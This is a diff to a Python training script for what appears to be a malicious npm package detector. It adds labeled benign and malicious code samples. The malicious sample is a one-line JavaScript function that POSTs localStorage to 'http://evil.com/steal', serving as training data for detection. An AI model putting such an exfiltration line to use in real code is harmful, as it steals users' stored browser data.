@@ -42,33 +42,64 @@ def setup_logging(log_level: str = "INFO"):
 
 def create_sample_data():
     """Create sample training data for demonstration."""
-    
+
     logger.info("Creating sample training data...")
-    
+
+    # Import UnitFeatures for creating realistic samples
+    from amil.feature_extractor import UnitFeatures
+
+    # Sample benign unit features
+    benign_unit = UnitFeatures(
+        raw_content="function isValid(input) { return input != null && input.length > 0; }",
+        file_path="src/utils.js",
+        unit_name="isValid",
+        unit_type="function",
+        ecosystem="npm",
+        api_counts={"validation": 1},
+        shannon_entropy=3.2,
+        obfuscation_score=0.1,
+        phase_indicators={"runtime": 1.0, "install": 0.0, "test": 0.0},
+        metadata={"file_size": 156, "imports_count": 0}
+    )
+
+    # Sample malicious unit features
+    malicious_unit = UnitFeatures(
+        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
+        file_path="src/stealer.js",
+        unit_name="stealData",
+        unit_type="function",
+        ecosystem="npm",
+        api_counts={"net.outbound": 1, "storage.access": 1},
+        shannon_entropy=4.1,
+        obfuscation_score=0.3,
+        phase_indicators={"runtime": 1.0, "install": 0.0, "test": 0.0},
+        metadata={"file_size": 98, "imports_count": 0}
+    )
+
     # Sample benign package
     benign_sample = PackageSample(
         package_name="sample-utils",
         ecosystem="npm",
         label=0,
-        unit_features=[],
+        unit_features=[benign_unit],
         sample_type="benign",
         metadata={}
     )
-    
-    # Sample malicious package  
+
+    # Sample malicious package
     malicious_sample = PackageSample(
         package_name="malicious-stealer",
-        ecosystem="npm", 
+        ecosystem="npm",
         label=1,
-        unit_features=[],
+        unit_features=[malicious_unit],
         sample_type="malicious_intent",
         metadata={}
     )
-    
+
     # Create minimal dataset
     train_samples = [benign_sample] * 100 + [malicious_sample] * 20
     val_samples = [benign_sample] * 20 + [malicious_sample] * 4
-    
+
     return train_samples, val_samples
 
 
